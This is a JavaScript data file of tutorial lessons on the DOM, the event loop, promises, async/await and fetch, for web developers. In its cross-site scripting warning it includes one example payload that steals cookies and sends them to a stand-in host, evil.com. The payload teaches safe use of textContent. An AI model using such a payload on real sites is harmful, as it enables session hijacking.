/* JavaScript — the browser: the DOM, events, async and fetch.

   This is where the language stops being an exercise and starts producing
   something a person can click. The async module is the important one: it is
   the single biggest source of confusion for people arriving from a language
   where everything blocks, and almost every "JavaScript is weird" complaint
   is really a misunderstanding of the event loop. */

TD.addLessons("js", [

/* ==================================================================== */
{
 t: "The DOM: Finding and Changing the Page",
 m: "dom",
 lvl: "core",
 s: "The page as a live object graph — selecting elements, changing them, and the security rule you must not break.",
 goal: [
  "Select elements with querySelector and know when to use querySelectorAll",
  "Change text, attributes and classes safely",
  "Explain why innerHTML with user data is a vulnerability"
 ],
 b: [
  { p: "The browser parses your HTML into a tree of objects called the **DOM**. That tree is not a copy — it *is* the page. Change a node and the screen updates immediately. Everything front-end follows from that one fact." },

  { dg: "dom-tree" },

  { h: "Finding things" },
  { code: { lang: "javascript", t: "Two methods cover almost everything",
    lines: [
     { c: "document.querySelector(\".card\")", w: "**The first match, or null.** Takes any CSS selector — the same ones you already know from styling.", hi: true },
     { c: "document.querySelector(\"#total\")", w: "By id." },
     { c: "document.querySelector(\"[data-role='save']\")", w: "By attribute. `data-*` attributes are the conventional hook for JavaScript, precisely so your selectors do not depend on styling classes that a designer may rename." },
     { c: "", w: "" },
     { c: "document.querySelectorAll(\".card\")", w: "**Every match**, as a NodeList." },
     { c: "", w: "" },
     { c: "const cards = document.querySelectorAll(\".card\");", w: "" },
     { c: "cards.forEach(c => c.classList.add(\"on\"));", w: "A NodeList has `forEach`, but not `map` or `filter`." },
     { c: "[...cards].filter(c => c.dataset.id)", w: "Spread it into a real array when you need the full set of array methods.", hi: true }
    ] } },

  { trap: "`querySelector` returns `null` when nothing matches, and `null.textContent` throws `Cannot read properties of null`. This is the most common runtime error in front-end JavaScript, and it is almost always caused by the script running before the element exists. Use `defer` on your script tag, and guard with `if (!el) return;` when an element is genuinely optional." },

  { h: "Changing things" },
  { code: { lang: "javascript", t: "Text, attributes, classes, styles",
    lines: [
     { c: "el.textContent = \"Hello\";", w: "**Text only.** Any markup in the string is shown literally, not parsed. This is what you want almost always." },
     { c: "", w: "" },
     { c: "el.innerHTML = \"<b>Hello</b>\";", w: "Parses the string as HTML. Powerful, and dangerous — see below." },
     { c: "", w: "" },
     { c: "el.classList.add(\"active\");", w: "" },
     { c: "el.classList.remove(\"active\");", w: "" },
     { c: "el.classList.toggle(\"active\");", w: "**The one you will use most.** Add if absent, remove if present." },
     { c: "el.classList.toggle(\"active\", isOn);", w: "With a boolean, it forces the state — clearer than an if/else." },
     { c: "", w: "" },
     { c: "el.dataset.userId = \"42\";", w: "Reads and writes `data-user-id`. The camelCase conversion is automatic." },
     { c: "el.setAttribute(\"aria-expanded\", \"true\");", w: "For ARIA and other attributes without a direct property." },
     { c: "", w: "" },
     { c: "el.style.setProperty(\"--gap\", \"12px\");", w: "Setting a CSS custom property from JavaScript, which is usually better than setting individual styles — it keeps the design decisions in the stylesheet." }
    ] } },

  { n: "Prefer toggling a class over setting `el.style` directly. Styles set from JavaScript are inline, which beats almost every stylesheet rule and makes the result very hard to override or theme. A class keeps the appearance in CSS where it belongs, and your JavaScript only decides *which state* the element is in.",
    nt: "Class, not style" },

  { h: "The security rule" },
  { vs: { t: "Displaying something a user typed", lang: "javascript",
    bad: { c: "el.innerHTML = comment;", label: "Cross-site scripting",
      w: "If `comment` is `<img src=x onerror=\"fetch('//evil.com?c='+document.cookie)\">`, the browser parses and runs it. The attacker now has the session cookie of every reader. This is XSS, and it is one of the most exploited vulnerabilities on the web." },
    good: { c: "el.textContent = comment;", label: "Safe, and simpler",
      w: "The string is inserted as text. Any tags are displayed as characters, exactly as typed. There is no parsing step, so there is nothing to exploit." } } },

  { p: "The rule: **`innerHTML` is only ever acceptable for markup you wrote yourself.** The moment any part of the string came from a user, a database, or an API, use `textContent` or build elements with `createElement`." },

  { code: { lang: "javascript", t: "Building an element properly",
    lines: [
     { c: "const li = document.createElement(\"li\");", w: "" },
     { c: "li.className = \"comment\";", w: "" },
     { c: "li.textContent = comment.body;", w: "User data, inserted as text. Safe by construction.", hi: true },
     { c: "list.append(li);", w: "`append` takes multiple nodes and plain strings; `appendChild` takes exactly one node. Prefer `append`." }
    ] } },

  { h: "Events" },
  { code: { lang: "javascript", t: "Listening, and the one pattern that scales",
    lines: [
     { c: "button.addEventListener(\"click\", (event) => {", w: "" },
     { c: "  event.preventDefault();", w: "Stop the browser's default behaviour — following a link, submitting a form." },
     { c: "  console.log(event.target);", w: "The element actually clicked, which may be a child of the one you attached to." },
     { c: "});", w: "" },
     { c: "", w: "" },
     { c: "// Event delegation: one listener for a whole list", w: "" },
     { c: "list.addEventListener(\"click\", (event) => {", w: "**Attach to the container, not each item.**", hi: true },
     { c: "  const item = event.target.closest(\"[data-id]\");", w: "`closest` walks up from the clicked node to find the row. This is what makes delegation work." },
     { c: "  if (!item) return;", w: "The click was in the container but not on a row." },
     { c: "  remove(item.dataset.id);", w: "" },
     { c: "});", w: "" }
    ],
    after: "Delegation matters for two reasons: one listener instead of a thousand, and it keeps working for rows added *after* the listener was attached. Anything that renders a dynamic list should use it." } },

  { tryit: { t: "Build a working list",
    task: "Write the code for a to-do list: an input, an Add button, and a list where each item has a Delete button. Handle deletion with one listener, not one per item.",
    hint: "Delegation on the list, `closest` to find the row, and `textContent` for the user's text.",
    sol: { lang: "javascript", code: "const form = document.querySelector(\"#todo-form\");\nconst input = document.querySelector(\"#todo-input\");\nconst list = document.querySelector(\"#todo-list\");\n\nlet nextId = 1;\n\nform.addEventListener(\"submit\", (e) => {\n  e.preventDefault();                    // do not reload the page\n  const text = input.value.trim();\n  if (!text) return;\n\n  const li = document.createElement(\"li\");\n  li.dataset.id = String(nextId++);\n\n  const span = document.createElement(\"span\");\n  span.textContent = text;               // user data -> textContent\n\n  const del = document.createElement(\"button\");\n  del.textContent = \"Delete\";\n  del.dataset.action = \"delete\";\n\n  li.append(span, del);                  // append takes several\n  list.append(li);\n\n  input.value = \"\";\n  input.focus();                         // ready for the next one\n});\n\n// ONE listener for every delete button, including future ones\nlist.addEventListener(\"click\", (e) => {\n  if (e.target.dataset.action !== \"delete\") return;\n  e.target.closest(\"li\").remove();\n});\n\n// Note the form 'submit' rather than button 'click': that way\n// pressing Enter in the input works too, for free." },
    w: "Two details worth keeping: listening for `submit` on the form rather than `click` on the button means the Enter key works without extra code, and delegation means the delete handler covers items that did not exist when the page loaded." } }
 ],
 k: [
  "The DOM is the live page — changing a node changes the screen immediately.",
  "`querySelector` takes CSS selectors and returns null when nothing matches.",
  "`textContent` for anything a user supplied; `innerHTML` only for markup you wrote.",
  "Toggle a class rather than setting inline styles.",
  "Delegate events to a container so one listener covers items added later."
 ],
 r: ["DOM", "Cross-Site Scripting", "JavaScript"],
 drill: {
  lang: "javascript",
  reps: 3,
  items: [
   { c: "const el = document.querySelector(\".card\");", w: "find the first matching element" },
   { c: "el.textContent = userInput;", w: "insert user data safely" },
   { c: "el.classList.toggle(\"active\", isOn);", w: "force a class on or off" },
   { c: "list.addEventListener(\"click\", (e) => {", w: "one listener for a whole list" },
   { c: "const row = e.target.closest(\"[data-id]\");", w: "walk up to the row that was clicked" }
  ]
 }
},

/* ==================================================================== */
{
 t: "The Event Loop, Promises and async/await",
 m: "async",
 lvl: "intermediate",
 s: "One thread that never blocks — the model behind every 'JavaScript is weird' complaint.",
 goal: [
  "Explain how one thread handles many concurrent operations",
  "Read a promise chain and its async/await equivalent",
  "Run independent operations in parallel rather than in series"
 ],
 b: [
  { p: "JavaScript has **one thread**. It cannot do two things at once. And yet a page stays responsive while downloading ten images and waiting on three API calls. The mechanism that makes that possible is the event loop, and understanding it removes most of the confusion around asynchronous code." },

  { h: "How one thread does many things" },
  { p: "The trick is that waiting is not working. When you request a file, JavaScript does not sit there — it hands the request to the browser, registers what to do when it finishes, and immediately continues. The browser does the waiting on other threads; your code is only ever woken up when there is something to do." },

  { dg: "event-loop" },

  { ol: [
   "The **call stack** runs your code, one thing at a time.",
   "Slow operations are handed to the **browser** (or Node), which handles them elsewhere.",
   "When one completes, its callback is put on a **queue**.",
   "The **event loop** takes from the queue and pushes onto the stack — but only when the stack is empty."
  ] },

  { trap: "\"Only when the stack is empty\" is the part that bites. A long synchronous loop blocks everything: no clicks register, no animation runs, nothing repaints, because the event loop never gets a turn. This is why heavy computation in the browser freezes the page rather than merely slowing it, and why such work belongs in a Web Worker." },

  { code: { lang: "javascript", t: "The output order that confuses everyone",
    lines: [
     { c: "console.log(\"1\");", w: "" },
     { c: "setTimeout(() => console.log(\"2\"), 0);", w: "Zero milliseconds — but still queued, not immediate." },
     { c: "Promise.resolve().then(() => console.log(\"3\"));", w: "" },
     { c: "console.log(\"4\");", w: "" }
    ],
    out: "1\n4\n3\n2",
    after: "`1` and `4` are synchronous and run first. Then the stack empties. `3` comes before `2` because promises use the **microtask** queue, which is fully drained before a single macrotask (`setTimeout`) is taken. `setTimeout(fn, 0)` means *as soon as possible after the current work*, never *now*." } },

  { h: "Promises" },
  { p: "A promise is an object representing a value that is not available yet. It is in one of three states — pending, fulfilled, or rejected — and it settles exactly once." },

  { code: { lang: "javascript", t: "The chain, and what each part is for",
    lines: [
     { c: "fetch(\"/api/user\")", w: "Returns a promise immediately. The request has not finished." },
     { c: "  .then(response => response.json())", w: "Runs when it resolves. Returning a promise here flattens it into the chain rather than nesting." },
     { c: "  .then(user => console.log(user.name))", w: "Receives whatever the previous `then` returned." },
     { c: "  .catch(error => console.error(error))", w: "**Catches a rejection anywhere above it.** One handler covers the whole chain, which is the main advantage over callbacks.", hi: true },
     { c: "  .finally(() => spinner.hide());", w: "Runs either way. The right place for cleanup." }
    ] } },

  { h: "async/await is the same thing, written flat" },
  { vs: { t: "Two spellings of one mechanism", lang: "javascript",
    bad: { c: "function load() {\n  return fetch(\"/api/user\")\n    .then(r => r.json())\n    .then(user => fetch(`/api/posts/${user.id}`))\n    .then(r => r.json())\n    .then(posts => ({ user, posts }));\n}", label: "Promise chain",
      w: "Correct, but note the bug: `user` is not in scope by the final line. Chains make sequential steps that depend on earlier values awkward, and people work around it with nesting — which is the pyramid promises were meant to remove." },
    good: { c: "async function load() {\n  const r1 = await fetch(\"/api/user\");\n  const user = await r1.json();\n\n  const r2 = await fetch(`/api/posts/${user.id}`);\n  const posts = await r2.json();\n\n  return { user, posts };\n}", label: "async / await",
      w: "The same promises underneath. `await` pauses this function until the promise settles, without blocking the thread — everything else on the page keeps running. Ordinary variables, ordinary scope, ordinary `try/catch`." } } },

  { n: "`async` on a function means it always returns a promise, whatever you return inside it. So calling an async function gives you a promise, not the value — which is why `const x = load()` gives you a pending promise and `console.log(x.user)` is `undefined`. You must `await` it, or `.then` it.",
    nt: "An async function always returns a promise" },

  { h: "The mistake that costs real time" },
  { vs: { t: "Fetching three independent things", lang: "javascript",
    bad: { c: "const a = await fetchA();  // 300ms\nconst b = await fetchB();  // 300ms\nconst c = await fetchC();  // 300ms\n\n// total: 900ms", label: "Sequential, needlessly",
      w: "Each `await` waits for the previous one to finish. If B does not need A's result, that waiting is pure waste — and this is the most common performance bug in async JavaScript." },
    good: { c: "const [a, b, c] = await Promise.all([\n  fetchA(),\n  fetchB(),\n  fetchC(),\n]);\n\n// total: ~300ms", label: "Started together",
      w: "All three requests are in flight before any is awaited. `Promise.all` waits for the slowest, so the total is the longest single request rather than the sum." } } },

  { code: { lang: "javascript", t: "The four combinators",
    lines: [
     { c: "await Promise.all(promises)", w: "All results — but **rejects as soon as any one rejects**, and you lose the successful results." },
     { c: "await Promise.allSettled(promises)", w: "**Waits for everything regardless**, giving `{status, value}` or `{status, reason}` per item. Use this when partial success is useful.", hi: true },
     { c: "await Promise.race(promises)", w: "The first to settle, success or failure. The classic use is racing a request against a timeout." },
     { c: "await Promise.any(promises)", w: "The first to *succeed*, ignoring rejections until they all fail." }
    ] } },

  { tryit: { t: "Fix the loop",
    task: "This fetches 50 user records and takes 15 seconds. Make it fast — and then explain why simply wrapping all 50 in `Promise.all` might be the wrong fix in production.\n\n`for (const id of ids) { users.push(await fetchUser(id)); }`",
    hint: "The first fix is obvious. The second question is about what 50 simultaneous requests do to a server.",
    sol: { lang: "javascript", code: "// The obvious fix -- all at once:\nconst users = await Promise.all(ids.map(id => fetchUser(id)));\n// 15s -> ~300ms\n\n// Why that can be wrong in production:\n//   * 50 simultaneous requests may trip a rate limit\n//   * browsers cap concurrent connections per host anyway (~6),\n//     so the extra promises just queue at a lower level\n//   * a server you do not own may treat it as abusive traffic\n//   * on a large list -- 5,000 ids -- you exhaust sockets or\n//     memory entirely\n\n// The production answer: bounded concurrency. Run N at a time.\nasync function mapLimit(items, limit, fn) {\n  const results = [];\n  const executing = new Set();\n\n  for (const item of items) {\n    const p = fn(item).then(r => { executing.delete(p); return r; });\n    results.push(p);\n    executing.add(p);\n    if (executing.size >= limit) await Promise.race(executing);\n  }\n  return Promise.all(results);\n}\n\nconst users = await mapLimit(ids, 5, fetchUser);\n\n// Better still, if the API supports it: one request for 50 ids.\n// The fastest request is the one you do not make." },
    w: "\"Sequential is slow, unlimited is rude\" is the shape of this whole class of problem. The right answer is nearly always bounded concurrency, and the best answer is usually a batch endpoint that makes the question moot." } }
 ],
 k: [
  "One thread; the event loop runs queued callbacks only when the stack is empty.",
  "Microtasks (promises) drain fully before any macrotask (setTimeout) runs.",
  "`async`/`await` is promise syntax — an async function always returns a promise.",
  "Sequential `await`s on independent work is the most common async performance bug.",
  "`Promise.all` fails fast; `allSettled` waits for everything and reports each outcome."
 ],
 r: ["Promise", "Event Loop", "Asynchronous Programming", "Callback"],
 drill: {
  lang: "javascript",
  reps: 3,
  items: [
   { c: "const data = await response.json();", w: "await a promise inside an async function" },
   { c: "const [a, b] = await Promise.all([fa(), fb()]);", w: "run independent work in parallel" },
   { c: "const results = await Promise.allSettled(jobs);", w: "wait for everything and keep partial results" },
   { c: "async function load() {", w: "declare a function that returns a promise" },
   { c: "setTimeout(() => console.log(\"later\"), 0);", w: "queue work for after the current stack" }
  ]
 }
},

/* ==================================================================== */
{
 t: "fetch: Talking to a Server",
 m: "fetch",
 lvl: "intermediate",
 s: "Requests, JSON, and the error handling that only matters once it is live.",
 goal: [
  "Make GET and POST requests and parse the response",
  "Explain why a 404 does not reject a fetch promise",
  "Handle timeouts, cancellation and CORS failures"
 ],
 b: [
  { p: "`fetch` is how the browser talks to a server without reloading the page. It returns a promise, it is built in, and it has one piece of surprising behaviour that causes a great many production bugs." },

  { h: "The basic shapes" },
  { code: { lang: "javascript", t: "GET and POST",
    lines: [
     { c: "const res = await fetch(\"/api/users\");", w: "GET by default." },
     { c: "const users = await res.json();", w: "**`json()` is itself async** — the body may still be arriving. This second await is not optional." },
     { c: "", w: "" },
     { c: "const res = await fetch(\"/api/users\", {", w: "" },
     { c: "  method: \"POST\",", w: "" },
     { c: "  headers: { \"Content-Type\": \"application/json\" },", w: "Without this header most servers will not parse your body, and you get a confusing 400.", hi: true },
     { c: "  body: JSON.stringify({ name: \"Aryan\" }),", w: "**`body` must be a string.** Passing an object sends the text `[object Object]`, which is a genuinely common mistake.", hi: true },
     { c: "});", w: "" }
    ] } },

  { h: "The surprise" },
  { trap: "**A 404 or a 500 does not reject the promise.** `fetch` only rejects on a *network* failure — the request never left, DNS failed, the connection dropped. An HTTP error response is a successful round trip as far as fetch is concerned, so your `catch` block never runs and your code carries on with an error page as though it were data. This is the single most common fetch bug." },

  { code: { lang: "javascript", t: "The wrapper worth writing once",
    lines: [
     { c: "async function api(url, options) {", w: "" },
     { c: "  const res = await fetch(url, options);", w: "" },
     { c: "", w: "" },
     { c: "  if (!res.ok) {", w: "**`res.ok` is true only for 200–299.** This check is what people forget.", hi: true },
     { c: "    const text = await res.text();", w: "Read the body for a reason — servers usually explain the failure." },
     { c: "    throw new Error(`${res.status} ${res.statusText}: ${text}`);", w: "Now a bad status behaves like every other error in your code." },
     { c: "  }", w: "" },
     { c: "", w: "" },
     { c: "  if (res.status === 204) return null;", w: "No Content. Calling `.json()` on an empty body throws a parse error, which looks like a server bug and is not." },
     { c: "  return res.json();", w: "" },
     { c: "}", w: "" }
    ] } },

  { h: "Timeouts and cancellation" },
  { p: "`fetch` has no timeout option. Left alone, a request to a server that accepts the connection and then goes silent will hang until the browser gives up — which can be over a minute. `AbortController` is the mechanism for both timeouts and deliberate cancellation." },

  { code: { lang: "javascript", t: "A request that gives up",
    lines: [
     { c: "const controller = new AbortController();", w: "" },
     { c: "const timer = setTimeout(() => controller.abort(), 5000);", w: "" },
     { c: "", w: "" },
     { c: "try {", w: "" },
     { c: "  const res = await fetch(url, { signal: controller.signal });", w: "The signal is what connects the controller to the request.", hi: true },
     { c: "  return await res.json();", w: "" },
     { c: "} catch (err) {", w: "" },
     { c: "  if (err.name === \"AbortError\") throw new Error(\"Timed out\");", w: "Distinguish a deliberate abort from a real failure — they need different messages." },
     { c: "  throw err;", w: "" },
     { c: "} finally {", w: "" },
     { c: "  clearTimeout(timer);", w: "Otherwise the timer fires later and aborts nothing, which is harmless but untidy." },
     { c: "}", w: "" }
    ],
    after: "The same controller cancels a request when a user navigates away or types a new search term — which is what stops a slow earlier response overwriting a fast later one." } },

  { h: "CORS, explained once" },
  { p: "A browser will not let a page at one origin read a response from another origin unless that server explicitly allows it. This is enforced *by the browser*, not by the server, and it protects users: without it, any page you visit could read your logged-in bank account." },

  { code: { lang: "text", t: "What the error actually means",
    lines: [
     { c: "Access to fetch at 'https://api.other.com/data'", w: "" },
     { c: "from origin 'http://localhost:3000' has been blocked", w: "" },
     { c: "by CORS policy: No 'Access-Control-Allow-Origin' header", w: "**The server did not permit your origin.** The request usually reached it and it replied — the browser then refused to hand you the response.", hi: true }
    ],
    after: "So this is not fixable from your JavaScript. The server must send the header, or you must call it from your own backend, where CORS does not apply because there is no browser. Extensions and flags that 'disable CORS' work only on your machine and are never a solution." } },

  { tryit: { t: "Write the search box",
    task: "A search input that queries an API as the user types. Handle: not firing on every keystroke, and making sure a slow response to an earlier query cannot overwrite a fast response to a later one.",
    hint: "Two separate problems: debouncing the input, and cancelling the previous request.",
    sol: { lang: "javascript", code: "let timer = null;\nlet controller = null;\n\ninput.addEventListener(\"input\", () => {\n  clearTimeout(timer);\n\n  // 1. Debounce -- wait for a pause before asking at all\n  timer = setTimeout(async () => {\n    const q = input.value.trim();\n    if (!q) { render([]); return; }\n\n    // 2. Cancel whatever is still in flight\n    if (controller) controller.abort();\n    controller = new AbortController();\n\n    try {\n      const res = await fetch(`/api/search?q=${encodeURIComponent(q)}`,\n                             { signal: controller.signal });\n      if (!res.ok) throw new Error(res.status);\n      render(await res.json());\n    } catch (err) {\n      if (err.name === \"AbortError\") return;   // expected, ignore\n      showError(\"Search failed\");\n    }\n  }, 300);\n});\n\n// Without the abort, this is the classic race:\n//   user types \"a\"   -> request A sent (slow, 800ms)\n//   user types \"ab\"  -> request B sent (fast, 100ms)\n//   B returns -> results for \"ab\" shown       correct\n//   A returns -> results for \"a\" OVERWRITE them   wrong\n//\n// The user sees results that do not match what is in the box,\n// and nothing errored. encodeURIComponent matters too: a query\n// containing & or # would otherwise corrupt the URL." },
    w: "This is one of the most common real interview tasks for front-end roles, and the out-of-order response is the part candidates miss. Debouncing alone reduces the frequency of the race without eliminating it." } }
 ],
 k: [
  "`fetch` rejects only on network failure — a 404 or 500 resolves normally.",
  "Always check `res.ok`, and remember `res.json()` is itself async.",
  "`body` must be a string; `JSON.stringify` it and set the Content-Type header.",
  "There is no timeout option — use `AbortController` for timeouts and cancellation.",
  "CORS is enforced by the browser and can only be fixed on the server."
 ],
 r: ["HTTP", "JSON", "Promise", "CORS"],
 drill: {
  lang: "javascript",
  reps: 3,
  items: [
   { c: "const res = await fetch(url);", w: "make a request and wait for the response" },
   { c: "if (!res.ok) throw new Error(res.status);", w: "the check people forget" },
   { c: "body: JSON.stringify({ name }),", w: "send a JSON body as a string" },
   { c: "const controller = new AbortController();", w: "create something that can cancel a request" },
   { c: "fetch(url, { signal: controller.signal })", w: "make a request that can be aborted" }
  ]
 }
}

]);
